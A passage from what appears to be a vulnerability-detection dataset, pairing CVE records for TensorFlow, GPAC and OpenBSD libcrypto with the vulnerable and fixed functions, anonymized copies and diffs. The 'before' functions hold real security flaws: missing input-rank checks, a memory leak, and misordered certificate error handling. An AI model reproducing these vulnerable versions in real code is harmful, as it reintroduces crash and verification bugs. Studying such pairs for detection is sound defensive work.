+      return errors::InvalidArgument(""Dense features at index "", i,
+                                     "" must be rank 2 but is rank "",
+                                     dense_features_inputs[i].dims());
+    }
+  }
 
   examples_.clear();
   examples_.resize(num_examples);","{'deleted_lines': [], 'added_lines': ['  for (int i = 0; i < dense_features_inputs.size(); ++i) {', '    if (!TensorShapeUtils::IsMatrix(dense_features_inputs[i].shape())) {', '      return errors::InvalidArgument(""Dense features at index "", i,', '                                     "" must be rank 2 but is rank "",', '                                     dense_features_inputs[i].dims());', '    }', '  }']}",True,"TensorFlow is an open source platform for machine learning. Inputs `dense_features` or `example_state_data` not of rank 2 will trigger a `CHECK` fail in `SdcaOptimizer`. We have patched the issue in GitHub commit 80ff197d03db2a70c6a111f97dcdacad1b0babfa. The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.",4.8,MEDIUM,1,valid,2022-09-30T20:56:12Z,4
CVE-2022-41899,['CWE-617'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,tensorflow,"Fix SDCA optimizer crash.

Validates size of the dense_features and example state_data_inputs.
Other validation already verifies that sizes are otherwise consistent.

This looks to be a v1-only op that isn't used internally at all outside
of `contrib`, and no tests.

PiperOrigin-RevId: 478073762",80ff197d03db2a70c6a111f97dcdacad1b0babfa,https://github.com/tensorflow/tensorflow/commit/80ff197d03db2a70c6a111f97dcdacad1b0babfa,tensorflow/core/kernels/sdca_ops.cc,DoCompute,"void DoCompute(const ComputeOptions& options, OpKernelContext* const context) {
ModelWeights model_weights;
OP_REQUIRES_OK(context, model_weights.Initialize(context));
Examples examples;
OP_REQUIRES_OK(
context,
examples.Initialize(context, model_weights, options.num_sparse_features,
options.num_sparse_features_with_values,
options.num_dense_features));
const Tensor* example_state_data_t;
OP_REQUIRES_OK(context,
context->input(""example_state_data"", &example_state_data_t));
TensorShape expected_example_state_shape({examples.num_examples(), 4});
OP_REQUIRES(context,
example_state_data_t->shape() == expected_example_state_shape,
errors::InvalidArgument(
""Expected shape "", expected_example_state_shape.DebugString(),
"" for example_state_data, got "",
example_state_data_t->shape().DebugString()));
Tensor mutable_example_state_data_t(*example_state_data_t);
auto example_state_data = mutable_example_state_data_t.matrix<float>();
OP_REQUIRES_OK(context, context->set_output(""out_example_state_data"",
mutable_example_state_data_t));
if (options.adaptive) {
OP_REQUIRES_OK(context,
examples.SampleAdaptiveProbabilities(
options.num_loss_partitions, options.regularizations,
model_weights, example_state_data, options.loss_updater,
1));
} else {
examples.RandomShuffle();
}
struct {
mutex mu;
Status value TF_GUARDED_BY(mu);
} train_step_status;
std::atomic<std::int64_t> atomic_index(-1);
auto train_step = [&](const int64_t begin, const int64_t end) {
for (int id = static_cast<int>(begin); id < end; ++id) {
const int64_t example_index = examples.sampled_index(++atomic_index);
const Example& example = examples.example(example_index);
const float dual = example_state_data(example_index, 0);
const float example_weight = example.example_weight();
float example_label = example.example_label();
const Status conversion_status =
options.loss_updater->ConvertLabel(&example_label);
if (!conversion_status.ok()) {
mutex_lock l(train_step_status.mu);
train_step_status.value = conversion_status;
return;
}
const ExampleStatistics example_statistics =
example.ComputeWxAndWeightedExampleNorm(
options.num_loss_partitions, model_weights,
options.regularizations, 1 );
const double new_dual = options.loss_updater->ComputeUpdatedDual(
options.num_loss_partitions, example_label, example_weight, dual,
example_statistics.wx[0], example_statistics.normalized_squared_norm);
const double normalized_bounded_dual_delta =
(new_dual - dual) * example_weight /
options.regularizations.symmetric_l2();
model_weights.UpdateDeltaWeights(
context->eigen_cpu_device(), example,
std::vector<double>{normalized_bounded_dual_delta});
example_state_data(example_index, 0) = new_dual;
example_state_data(example_index, 1) =
options.loss_updater->ComputePrimalLoss(
example_statistics.prev_wx[0], example_label, example_weight);
example_state_data(example_index, 2) =
options.loss_updater->ComputeDualLoss(dual, example_label,
example_weight);
example_state_data(example_index, 3) = example_weight;
}
};
const int64_t kCostPerUnit = examples.num_features();
const DeviceBase::CpuWorkerThreads& worker_threads =
*context->device()->tensorflow_cpu_worker_threads();
Shard(worker_threads.num_threads, worker_threads.workers,
examples.num_examples(), kCostPerUnit, train_step);
mutex_lock l(train_step_status.mu);
OP_REQUIRES_OK(context, train_step_status.value);
}","void DoCompute(const ComputeOptions& VAR_0, OpKernelContext* const VAR_1) {
ModelWeights VAR_2;
OP_REQUIRES_OK(VAR_1, VAR_2.Initialize(VAR_1));
Examples VAR_3;
OP_REQUIRES_OK(
VAR_1,
VAR_3.Initialize(VAR_1, VAR_2, VAR_0.num_sparse_features,
VAR_0.num_sparse_features_with_values,
VAR_0.num_dense_features));
const Tensor* VAR_4;
OP_REQUIRES_OK(VAR_1,
VAR_1->input(""example_state_data"", &VAR_4));
TensorShape VAR_5({VAR_3.num_examples(), 4});
OP_REQUIRES(VAR_1,
VAR_4->shape() == VAR_5,
errors::InvalidArgument(
""Expected shape "", VAR_5.DebugString(),
"" for example_state_data, got "",
VAR_4->shape().DebugString()));
Tensor VAR_6(*VAR_4);
auto VAR_7 = VAR_6.matrix<float>();
OP_REQUIRES_OK(VAR_1, VAR_1->set_output(""out_example_state_data"",
VAR_6));
if (VAR_0.adaptive) {
OP_REQUIRES_OK(VAR_1,
VAR_3.SampleAdaptiveProbabilities(
VAR_0.num_loss_partitions, VAR_0.regularizations,
VAR_2, VAR_7, VAR_0.loss_updater,
1));
} else {
VAR_3.RandomShuffle();
}
struct {
mutex mu;
Status VAR_8 TF_GUARDED_BY(mu);
} VAR_9;
std::atomic<std::int64_t> VAR_10(-1);
auto VAR_11 = [&](const int64_t VAR_12, const int64_t VAR_13) {
for (int VAR_14 = VAR_15<int>(VAR_12); VAR_14 < VAR_13; ++VAR_14) {
const int64_t VAR_16 = VAR_3.sampled_index(++VAR_10);
const Example& VAR_17 = VAR_3.example(VAR_16);
const float VAR_18 = VAR_7(VAR_16, 0);
const float VAR_19 = VAR_17.example_weight();
float VAR_20 = VAR_17.example_label();
const Status VAR_21 =
VAR_0.loss_updater->ConvertLabel(&VAR_20);
if (!VAR_21.ok()) {
mutex_lock VAR_22(VAR_9.mu);
VAR_9.value = VAR_21;
return;
}
const ExampleStatistics VAR_23 =
VAR_17.ComputeWxAndWeightedExampleNorm(
VAR_0.num_loss_partitions, VAR_2,
VAR_0.regularizations, 1 );
const double VAR_24 = VAR_0.loss_updater->ComputeUpdatedDual(
VAR_0.num_loss_partitions, VAR_20, VAR_19, VAR_18,
VAR_23.wx[0], VAR_23.normalized_squared_norm);
const double VAR_25 =
(VAR_24 - VAR_18) * VAR_19 /
VAR_0.regularizations.symmetric_l2();
VAR_2.UpdateDeltaWeights(
VAR_1->eigen_cpu_device(), VAR_17,
std::vector<double>{VAR_25});
VAR_7(VAR_16, 0) = VAR_24;
VAR_7(VAR_16, 1) =
VAR_0.loss_updater->ComputePrimalLoss(
VAR_23.prev_wx[0], VAR_20, VAR_19);
VAR_7(VAR_16, 2) =
VAR_0.loss_updater->ComputeDualLoss(VAR_18, VAR_20,
VAR_19);
VAR_7(VAR_16, 3) = VAR_19;
}
};
const int64_t VAR_26 = VAR_3.num_features();
const DeviceBase::CpuWorkerThreads& VAR_27 =
*VAR_1->device()->tensorflow_cpu_worker_threads();
Shard(VAR_27.num_threads, VAR_27.workers,
VAR_3.num_examples(), VAR_26, VAR_11);
mutex_lock VAR_22(VAR_9.mu);
OP_REQUIRES_OK(VAR_1, VAR_9.value);
}",tensorflow/80ff197d03db2a70c6a111f97dcdacad1b0babfa/sdca_ops.cc/vul/before/0.json,"void DoCompute(const ComputeOptions& options, OpKernelContext* const context) {
  ModelWeights model_weights;
  OP_REQUIRES_OK(context, model_weights.Initialize(context));

  Examples examples;
  OP_REQUIRES_OK(
      context,
      examples.Initialize(context, model_weights, options.num_sparse_features,
                          options.num_sparse_features_with_values,
                          options.num_dense_features));

  const Tensor* example_state_data_t;
  OP_REQUIRES_OK(context,
                 context->input(""example_state_data"", &example_state_data_t));
  OP_REQUIRES(
      context, TensorShapeUtils::IsMatrix(example_state_data_t->shape()),
      errors::InvalidArgument(""example_state_data must be rank 2 but is rank "",
                              example_state_data_t->dims()));
  TensorShape expected_example_state_shape({examples.num_examples(), 4});
  OP_REQUIRES(context,
              example_state_data_t->shape() == expected_example_state_shape,
              errors::InvalidArgument(
                  ""Expected shape "", expected_example_state_shape.DebugString(),
                  "" for example_state_data, got "",
                  example_state_data_t->shape().DebugString()));

  Tensor mutable_example_state_data_t(*example_state_data_t);
  auto example_state_data = mutable_example_state_data_t.matrix<float>();
  OP_REQUIRES_OK(context, context->set_output(""out_example_state_data"",
                                              mutable_example_state_data_t));

  if (options.adaptive) {
    OP_REQUIRES_OK(context,
                   examples.SampleAdaptiveProbabilities(
                       options.num_loss_partitions, options.regularizations,
                       model_weights, example_state_data, options.loss_updater,
                       /*num_weight_vectors =*/1));
  } else {
    examples.RandomShuffle();
  }
  struct {
    mutex mu;
    Status value TF_GUARDED_BY(mu);
  } train_step_status;
  std::atomic<std::int64_t> atomic_index(-1);
  auto train_step = [&](const int64_t begin, const int64_t end) {
    // The static_cast here is safe since begin and end can be at most
    // num_examples which is an int.
    for (int id = static_cast<int>(begin); id < end; ++id) {
      const int64_t example_index = examples.sampled_index(++atomic_index);
      const Example& example = examples.example(example_index);
      const float dual = example_state_data(example_index, 0);
      const float example_weight = example.example_weight();
      float example_label = example.example_label();
      const Status conversion_status =
          options.loss_updater->ConvertLabel(&example_label);
      if (!conversion_status.ok()) {
        mutex_lock l(train_step_status.mu);
        train_step_status.value = conversion_status;
        // Return from this worker thread - the calling thread is
        // responsible for checking context status and returning on error.
        return;
      }

      // Compute wx, example norm weighted by regularization, dual loss,
      // primal loss.
      // For binary SDCA, num_weight_vectors should be one.
      const ExampleStatistics example_statistics =
          example.ComputeWxAndWeightedExampleNorm(
              options.num_loss_partitions, model_weights,
              options.regularizations, 1 /* num_weight_vectors */);

      const double new_dual = options.loss_updater->ComputeUpdatedDual(
          options.num_loss_partitions, example_label, example_weight, dual,
          example_statistics.wx[0], example_statistics.normalized_squared_norm);

      // Compute new weights.
      const double normalized_bounded_dual_delta =
          (new_dual - dual) * example_weight /
          options.regularizations.symmetric_l2();
      model_weights.UpdateDeltaWeights(
          context->eigen_cpu_device(), example,
          std::vector<double>{normalized_bounded_dual_delta});

      // Update example data.
      example_state_data(example_index, 0) = new_dual;
      example_state_data(example_index, 1) =
          options.loss_updater->ComputePrimalLoss(
              example_statistics.prev_wx[0], example_label, example_weight);
      example_state_data(example_index, 2) =
          options.loss_updater->ComputeDualLoss(dual, example_label,
                                                example_weight);
      example_state_data(example_index, 3) = example_weight;
    }
  };
  // TODO(sibyl-Aix6ihai): Tune this properly based on sparsity of the data,
  // number of cpus, and cost per example.
  const int64_t kCostPerUnit = examples.num_features();
  const DeviceBase::CpuWorkerThreads& worker_threads =
      *context->device()->tensorflow_cpu_worker_threads();

  Shard(worker_threads.num_threads, worker_threads.workers,
        examples.num_examples(), kCostPerUnit, train_step);
  mutex_lock l(train_step_status.mu);
  OP_REQUIRES_OK(context, train_step_status.value);
}","void DoCompute(const ComputeOptions& VAR_0, OpKernelContext* const VAR_1) {
  ModelWeights VAR_2;
  OP_REQUIRES_OK(VAR_1, VAR_2.Initialize(VAR_1));

  Examples VAR_3;
  OP_REQUIRES_OK(
      VAR_1,
      VAR_3.Initialize(VAR_1, VAR_2, VAR_0.num_sparse_features,
                          VAR_0.num_sparse_features_with_values,
                          VAR_0.num_dense_features));

  const Tensor* VAR_4;
  OP_REQUIRES_OK(VAR_1,
                 VAR_1->input(""example_state_data"", &VAR_4));
  OP_REQUIRES(
      VAR_1, TensorShapeUtils::IsMatrix(VAR_4->shape()),
      errors::InvalidArgument(""example_state_data must be rank 2 but is rank "",
                              VAR_4->dims()));
  TensorShape VAR_5({VAR_3.num_examples(), 4});
  OP_REQUIRES(VAR_1,
              VAR_4->shape() == VAR_5,
              errors::InvalidArgument(
                  ""Expected shape "", VAR_5.DebugString(),
                  "" for example_state_data, got "",
                  VAR_4->shape().DebugString()));

  Tensor VAR_6(*VAR_4);
  auto VAR_7 = VAR_6.matrix<float>();
  OP_REQUIRES_OK(VAR_1, VAR_1->set_output(""out_example_state_data"",
                                              VAR_6));

  if (VAR_0.adaptive) {
    OP_REQUIRES_OK(VAR_1,
                   VAR_3.SampleAdaptiveProbabilities(
                       VAR_0.num_loss_partitions, VAR_0.regularizations,
                       VAR_2, VAR_7, VAR_0.loss_updater,
                       /* COMMENT_0 */1));
  } else {
    VAR_3.RandomShuffle();
  }
  struct {
    mutex mu;
    Status VAR_8 TF_GUARDED_BY(mu);
  } VAR_9;
  std::atomic<std::int64_t> VAR_10(-1);
  auto VAR_11 = [&](const int64_t VAR_12, const int64_t VAR_13) {
    /* COMMENT_1 */
    /* COMMENT_2 */
    for (int VAR_14 = VAR_15<int>(VAR_12); VAR_14 < VAR_13; ++VAR_14) {
      const int64_t VAR_16 = VAR_3.sampled_index(++VAR_10);
      const Example& VAR_17 = VAR_3.example(VAR_16);
      const float VAR_18 = VAR_7(VAR_16, 0);
      const float VAR_19 = VAR_17.example_weight();
      float VAR_20 = VAR_17.example_label();
      const Status VAR_21 =
          VAR_0.loss_updater->ConvertLabel(&VAR_20);
      if (!VAR_21.ok()) {
        mutex_lock VAR_22(VAR_9.mu);
        VAR_9.value = VAR_21;
        /* COMMENT_3 */
        /* COMMENT_4 */
        return;
      }

      /* COMMENT_5 */
      /* COMMENT_6 */
      /* COMMENT_7 */
      const ExampleStatistics VAR_23 =
          VAR_17.ComputeWxAndWeightedExampleNorm(
              VAR_0.num_loss_partitions, VAR_2,
              VAR_0.regularizations, 1 /* COMMENT_8 */);

      const double VAR_24 = VAR_0.loss_updater->ComputeUpdatedDual(
          VAR_0.num_loss_partitions, VAR_20, VAR_19, VAR_18,
          VAR_23.wx[0], VAR_23.normalized_squared_norm);

      /* COMMENT_9 */
      const double VAR_25 =
          (VAR_24 - VAR_18) * VAR_19 /
          VAR_0.regularizations.symmetric_l2();
      VAR_2.UpdateDeltaWeights(
          VAR_1->eigen_cpu_device(), VAR_17,
          std::vector<double>{VAR_25});

      /* COMMENT_10 */
      VAR_7(VAR_16, 0) = VAR_24;
      VAR_7(VAR_16, 1) =
          VAR_0.loss_updater->ComputePrimalLoss(
              VAR_23.prev_wx[0], VAR_20, VAR_19);
      VAR_7(VAR_16, 2) =
          VAR_0.loss_updater->ComputeDualLoss(VAR_18, VAR_20,
                                                VAR_19);
      VAR_7(VAR_16, 3) = VAR_19;
    }
  };
  /* COMMENT_11 */
  /* COMMENT_12 */
  const int64_t VAR_26 = VAR_3.num_features();
  const DeviceBase::CpuWorkerThreads& VAR_27 =
      *VAR_1->device()->tensorflow_cpu_worker_threads();

  Shard(VAR_27.num_threads, VAR_27.workers,
        VAR_3.num_examples(), VAR_26, VAR_11);
  mutex_lock VAR_22(VAR_9.mu);
  OP_REQUIRES_OK(VAR_1, VAR_9.value);
}",tensorflow/80ff197d03db2a70c6a111f97dcdacad1b0babfa/sdca_ops.cc/vul/after/0.json,"--- func_before
+++ func_after
@@ -12,6 +12,10 @@
   const Tensor* example_state_data_t;
   OP_REQUIRES_OK(context,
                  context->input(""example_state_data"", &example_state_data_t));
+  OP_REQUIRES(
+      context, TensorShapeUtils::IsMatrix(example_state_data_t->shape()),
+      errors::InvalidArgument(""example_state_data must be rank 2 but is rank "",
+                              example_state_data_t->dims()));
   TensorShape expected_example_state_shape({examples.num_examples(), 4});
   OP_REQUIRES(context,
               example_state_data_t->shape() == expected_example_state_shape,","{'deleted_lines': [], 'added_lines': ['  OP_REQUIRES(', '      context, TensorShapeUtils::IsMatrix(example_state_data_t->shape()),', '      errors::InvalidArgument(""example_state_data must be rank 2 but is rank "",', '                              example_state_data_t->dims()));']}",True,"TensorFlow is an open source platform for machine learning. Inputs `dense_features` or `example_state_data` not of rank 2 will trigger a `CHECK` fail in `SdcaOptimizer`. We have patched the issue in GitHub commit 80ff197d03db2a70c6a111f97dcdacad1b0babfa. The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.",4.8,MEDIUM,1,valid,2022-09-30T20:56:12Z,4
CVE-2022-43255,['CWE-401'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,fixed #2285,d82e1340d7fd5ceea205e0f173500102f3237eb4,https://github.com/gpac/gpac/commit/d82e1340d7fd5ceea205e0f173500102f3237eb4,src/scene_manager/loader_xmt.c,load_xmt_done,"static void load_xmt_done(GF_SceneLoader *load)
{
GF_XMTParser *parser = (GF_XMTParser *)load->loader_priv;
if (!parser) return;
while (1) {
XMTNodeStack *st = (XMTNodeStack *)gf_list_last(parser->nodes);
if (!st) break;
gf_list_rem_last(parser->nodes);
gf_node_register(st->node, NULL);
gf_node_unregister(st->node, NULL);
gf_free(st);
}
if (parser->x3d_root) gf_free(parser->x3d_root);
gf_list_del(parser->nodes);
gf_list_del(parser->descriptors);
gf_list_del(parser->def_nodes);
gf_list_del(parser->peeked_nodes);
gf_list_del(parser->inserted_routes);
gf_list_del(parser->unresolved_routes);
gf_list_del(parser->od_links);
gf_list_del(parser->esd_links);
gf_xml_sax_del(parser->sax_parser);
if (parser->script_to_load) gf_list_del(parser->script_to_load);
gf_free(parser);
load->loader_priv = NULL;
}","static void load_xmt_done(GF_SceneLoader *VAR_0)
{
GF_XMTParser *VAR_1 = (GF_XMTParser *)VAR_0->loader_priv;
if (!VAR_1) return;
while (1) {
XMTNodeStack *VAR_2 = (XMTNodeStack *)gf_list_last(VAR_1->nodes);
if (!VAR_2) break;
gf_list_rem_last(VAR_1->nodes);
gf_node_register(VAR_2->node, NULL);
gf_node_unregister(VAR_2->node, NULL);
gf_free(VAR_2);
}
if (VAR_1->x3d_root) gf_free(VAR_1->x3d_root);
gf_list_del(VAR_1->nodes);
gf_list_del(VAR_1->descriptors);
gf_list_del(VAR_1->def_nodes);
gf_list_del(VAR_1->peeked_nodes);
gf_list_del(VAR_1->inserted_routes);
gf_list_del(VAR_1->unresolved_routes);
gf_list_del(VAR_1->od_links);
gf_list_del(VAR_1->esd_links);
gf_xml_sax_del(VAR_1->sax_parser);
if (VAR_1->script_to_load) gf_list_del(VAR_1->script_to_load);
gf_free(VAR_1);
VAR_0->loader_priv = NULL;
}",gpac/d82e1340d7fd5ceea205e0f173500102f3237eb4/loader_xmt.c/vul/before/0.json,"static void load_xmt_done(GF_SceneLoader *load)
{
	GF_XMTParser *parser = (GF_XMTParser *)load->loader_priv;
	if (!parser) return;

	while (1) {
		XMTNodeStack *st = (XMTNodeStack *)gf_list_last(parser->nodes);
		if (!st) break;
		gf_list_rem_last(parser->nodes);
		gf_node_register(st->node, NULL);
		gf_node_unregister(st->node, NULL);
		gf_free(st);
	}
	if (parser->x3d_root) gf_free(parser->x3d_root);
	gf_list_del(parser->nodes);
	//we may have one root desc remaining if error
	if (gf_list_count(parser->descriptors)) {
		GF_Descriptor *desc = gf_list_get(parser->descriptors, 0);
		gf_odf_desc_del(desc);
	}
	gf_list_del(parser->descriptors);
	gf_list_del(parser->def_nodes);
	gf_list_del(parser->peeked_nodes);

	gf_list_del(parser->inserted_routes);
	gf_list_del(parser->unresolved_routes);
	gf_list_del(parser->od_links);
	gf_list_del(parser->esd_links);
	gf_xml_sax_del(parser->sax_parser);
	if (parser->script_to_load) gf_list_del(parser->script_to_load);
	gf_free(parser);
	load->loader_priv = NULL;
}","static void load_xmt_done(GF_SceneLoader *VAR_0)
{
	GF_XMTParser *VAR_1 = (GF_XMTParser *)VAR_0->loader_priv;
	if (!VAR_1) return;

	while (1) {
		XMTNodeStack *VAR_2 = (XMTNodeStack *)gf_list_last(VAR_1->nodes);
		if (!VAR_2) break;
		gf_list_rem_last(VAR_1->nodes);
		gf_node_register(VAR_2->node, NULL);
		gf_node_unregister(VAR_2->node, NULL);
		gf_free(VAR_2);
	}
	if (VAR_1->x3d_root) gf_free(VAR_1->x3d_root);
	gf_list_del(VAR_1->nodes);
	/* COMMENT_0 */
	if (gf_list_count(VAR_1->descriptors)) {
		GF_Descriptor *VAR_3 = gf_list_get(VAR_1->descriptors, 0);
		gf_odf_desc_del(VAR_3);
	}
	gf_list_del(VAR_1->descriptors);
	gf_list_del(VAR_1->def_nodes);
	gf_list_del(VAR_1->peeked_nodes);

	gf_list_del(VAR_1->inserted_routes);
	gf_list_del(VAR_1->unresolved_routes);
	gf_list_del(VAR_1->od_links);
	gf_list_del(VAR_1->esd_links);
	gf_xml_sax_del(VAR_1->sax_parser);
	if (VAR_1->script_to_load) gf_list_del(VAR_1->script_to_load);
	gf_free(VAR_1);
	VAR_0->loader_priv = NULL;
}",gpac/d82e1340d7fd5ceea205e0f173500102f3237eb4/loader_xmt.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -13,6 +13,11 @@
 	}
 	if (parser->x3d_root) gf_free(parser->x3d_root);
 	gf_list_del(parser->nodes);
+	//we may have one root desc remaining if error
+	if (gf_list_count(parser->descriptors)) {
+		GF_Descriptor *desc = gf_list_get(parser->descriptors, 0);
+		gf_odf_desc_del(desc);
+	}
 	gf_list_del(parser->descriptors);
 	gf_list_del(parser->def_nodes);
 	gf_list_del(parser->peeked_nodes);","{'deleted_lines': [], 'added_lines': ['\t//we may have one root desc remaining if error', '\tif (gf_list_count(parser->descriptors)) {', '\t\tGF_Descriptor *desc = gf_list_get(parser->descriptors, 0);', '\t\tgf_odf_desc_del(desc);', '\t}']}",True,GPAC v2.1-DEV-rev368-gfd054169b-master was discovered to contain a memory leak via the component gf_odf_new_iod at odf/odf_code.c.,5.5,MEDIUM,1,valid,2022-10-11T08:37:25Z,4
CVE-2022-48437,['CWE-295'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N,1,openbsd/src,"Store errors that result from leaf certificate verification.

In the case that a verification callback is installed that tells the
verifier to continue when a certificate is invalid (e.g. expired),
any error resulting from the leaf certificate verification is not stored
and made available post verification, resulting in an incorrect error being
returned.

Also perform leaf certificate verification prior to adding the chain, which
avoids a potential memory leak (as noted by tb@).

Issue reported by Ilya Shipitsin, who encountered haproxy regress failures.

ok tb@",4f94258c65a918ee3d8670e93916d15bf879e6ec,https://github.com/openbsd/src/commit/4f94258c65a918ee3d8670e93916d15bf879e6ec,lib/libcrypto/x509/x509_verify.c,x509_verify_ctx_add_chain,"static int
x509_verify_ctx_add_chain(struct x509_verify_ctx *ctx,
struct x509_verify_chain *chain, char *name)
{
size_t depth;
X509 *last = x509_verify_chain_last(chain);
X509 *leaf = x509_verify_chain_leaf(chain);
depth = sk_X509_num(chain->certs);
if (depth > 0)
depth--;
if (ctx->chains_count >= ctx->max_chains)
return x509_verify_cert_error(ctx, last, depth,
X509_V_ERR_CERT_CHAIN_TOO_LONG, 0);
if (chain->cert_errors[depth] ==
X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY)
chain->cert_errors[depth] = X509_V_OK;
if (!x509_verify_ctx_validate_legacy_chain(ctx, chain, depth))
return 0;
if ((ctx->chains[ctx->chains_count] = x509_verify_chain_dup(chain)) ==
NULL) {
return x509_verify_cert_error(ctx, last, depth,
X509_V_ERR_OUT_OF_MEM, 0);
}
if (!x509_verify_cert_valid(ctx, leaf, NULL))
return 0;
if (!x509_verify_cert_hostname(ctx, leaf, name))
return 0;
ctx->chains_count++;
ctx->error = X509_V_OK;
ctx->error_depth = depth;
return 1;
}","static int
x509_verify_ctx_add_chain(struct x509_verify_ctx *VAR_0,
struct x509_verify_chain *VAR_1, char *VAR_2)
{
size_t VAR_3;
X509 *VAR_4 = x509_verify_chain_last(VAR_1);
X509 *VAR_5 = x509_verify_chain_leaf(VAR_1);
VAR_3 = sk_X509_num(VAR_1->certs);
if (VAR_3 > 0)
VAR_3--;
if (VAR_0->chains_count >= VAR_0->max_chains)
return x509_verify_cert_error(VAR_0, VAR_4, VAR_3,
VAR_6, 0);
if (VAR_1->cert_errors[VAR_3] ==
VAR_7)
VAR_1->cert_errors[VAR_3] = VAR_8;
if (!x509_verify_ctx_validate_legacy_chain(VAR_0, VAR_1, VAR_3))
return 0;
if ((VAR_0->chains[VAR_0->chains_count] = x509_verify_chain_dup(VAR_1)) ==
NULL) {
return x509_verify_cert_error(VAR_0, VAR_4, VAR_3,
VAR_9, 0);
}
if (!x509_verify_cert_valid(VAR_0, VAR_5, NULL))
return 0;
if (!x509_verify_cert_hostname(VAR_0, VAR_5, VAR_2))
return 0;
VAR_0->chains_count++;
VAR_0->error = VAR_8;
VAR_0->error_depth = VAR_3;
return 1;
}",openbsd/src/4f94258c65a918ee3d8670e93916d15bf879e6ec/x509_verify.c/vul/before/0.json,"static int
x509_verify_ctx_add_chain(struct x509_verify_ctx *ctx,
    struct x509_verify_chain *chain, char *name)
{
	size_t depth;
	X509 *last = x509_verify_chain_last(chain);
	X509 *leaf = x509_verify_chain_leaf(chain);

	depth = sk_X509_num(chain->certs);
	if (depth > 0)
		depth--;

	if (ctx->chains_count >= ctx->max_chains)
		return x509_verify_cert_error(ctx, last, depth,
		    X509_V_ERR_CERT_CHAIN_TOO_LONG, 0);

	/* Clear a get issuer failure for a root certificate. */
	if (chain->cert_errors[depth] ==
	    X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY)
		chain->cert_errors[depth] = X509_V_OK;

	if (!x509_verify_ctx_validate_legacy_chain(ctx, chain, depth))
		return 0;

	/* Verify the leaf certificate and store any resulting error. */
	if (!x509_verify_cert_valid(ctx, leaf, NULL))
		return 0;
	if (!x509_verify_cert_hostname(ctx, leaf, name))
		return 0;
	if (ctx->error_depth == 0 &&
	    ctx->error != X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY)
		chain->cert_errors[0] = ctx->error;

	/*
	 * In the non-legacy code, extensions and purpose are dealt
	 * with as the chain is built.
	 *
	 * The non-legacy api returns multiple chains but does not do
	 * any revocation checking (it must be done by the caller on
	 * any chain they wish to use)
	 */

	if ((ctx->chains[ctx->chains_count] = x509_verify_chain_dup(chain)) ==
	    NULL) {
		return x509_verify_cert_error(ctx, last, depth,
		    X509_V_ERR_OUT_OF_MEM, 0);
	}
	ctx->chains_count++;

	ctx->error = X509_V_OK;
	ctx->error_depth = depth;

	return 1;
}","static int
x509_verify_ctx_add_chain(struct x509_verify_ctx *VAR_0,
    struct x509_verify_chain *VAR_1, char *VAR_2)
{
	size_t VAR_3;
	X509 *VAR_4 = x509_verify_chain_last(VAR_1);
	X509 *VAR_5 = x509_verify_chain_leaf(VAR_1);

	VAR_3 = sk_X509_num(VAR_1->certs);
	if (VAR_3 > 0)
		VAR_3--;

	if (VAR_0->chains_count >= VAR_0->max_chains)
		return x509_verify_cert_error(VAR_0, VAR_4, VAR_3,
		    VAR_6, 0);

	/* COMMENT_0 */
	if (VAR_1->cert_errors[VAR_3] ==
	    VAR_7)
		VAR_1->cert_errors[VAR_3] = VAR_8;

	if (!x509_verify_ctx_validate_legacy_chain(VAR_0, VAR_1, VAR_3))
		return 0;

	/* COMMENT_1 */
	if (!x509_verify_cert_valid(VAR_0, VAR_5, NULL))
		return 0;
	if (!x509_verify_cert_hostname(VAR_0, VAR_5, VAR_2))
		return 0;
	if (VAR_0->error_depth == 0 &&
	    VAR_0->error != VAR_7)
		VAR_1->cert_errors[0] = VAR_0->error;

	/* COMMENT_2 */
                                                            
                               
   
                                                              
                                                             
                               
    

	if ((VAR_0->chains[VAR_0->chains_count] = x509_verify_chain_dup(VAR_1)) ==
	    NULL) {
		return x509_verify_cert_error(VAR_0, VAR_4, VAR_3,
		    VAR_9, 0);
	}
	VAR_0->chains_count++;

	VAR_0->error = VAR_8;
	VAR_0->error_depth = VAR_3;

	return 1;
}",openbsd/src/4f94258c65a918ee3d8670e93916d15bf879e6ec/x509_verify.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -22,6 +22,15 @@
 	if (!x509_verify_ctx_validate_legacy_chain(ctx, chain, depth))
 		return 0;
 
+	/* Verify the leaf certificate and store any resulting error. */
+	if (!x509_verify_cert_valid(ctx, leaf, NULL))
+		return 0;
+	if (!x509_verify_cert_hostname(ctx, leaf, name))
+		return 0;
+	if (ctx->error_depth == 0 &&
+	    ctx->error != X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY)
+		chain->cert_errors[0] = ctx->error;
+
 	/*
 	 * In the non-legacy code, extensions and purpose are dealt
 	 * with as the chain is built.
@@ -36,15 +45,10 @@
 		return x509_verify_cert_error(ctx, last, depth,
 		    X509_V_ERR_OUT_OF_MEM, 0);
 	}
+	ctx->chains_count++;
 
-	if (!x509_verify_cert_valid(ctx, leaf, NULL))
-		return 0;
-
-	if (!x509_verify_cert_hostname(ctx, leaf, name))
-		return 0;
-
-	ctx->chains_count++;
 	ctx->error = X509_V_OK;
 	ctx->error_depth = depth;
+
 	return 1;
